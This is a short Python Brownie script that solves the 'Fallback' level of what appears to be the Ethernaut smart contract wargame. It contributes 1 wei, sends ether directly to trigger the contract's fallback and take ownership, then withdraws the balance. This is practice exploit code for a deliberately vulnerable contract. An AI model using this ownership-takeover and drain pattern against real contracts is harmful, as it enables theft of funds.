from brownie import Fallback, Contract

from scripts.helpful_scripts import get_account, get_new_instance, submit_instance

LEVEL_NAME = "01_fallback"
INTERFACE_CONTRACT = Fallback


def get_level_contract():
    instance_address = get_new_instance(LEVEL_NAME)
    level_contract = Contract.from_abi(
        INTERFACE_CONTRACT._name, instance_address, INTERFACE_CONTRACT.abi
    )
    return level_contract


def solve_level(level_contract):
    account = get_account()
    level_contract.contribute({"amount": 1, "from": account})
    account.transfer(level_contract, "1 wei")
    level_contract.withdraw({"from": account})


# brownie run scripts/_01_fallback.py --network rinkeby-fork
def main():
    level_contract = get_level_contract()
    solve_level(level_contract)
    level_solved = submit_instance(level_contract.address)
    if level_solved:
        print("You have completed level -> " + LEVEL_NAME)
    else:
        print(f"Looks like you haven't cracked level {LEVEL_NAME} just yet!")
    return level_solved
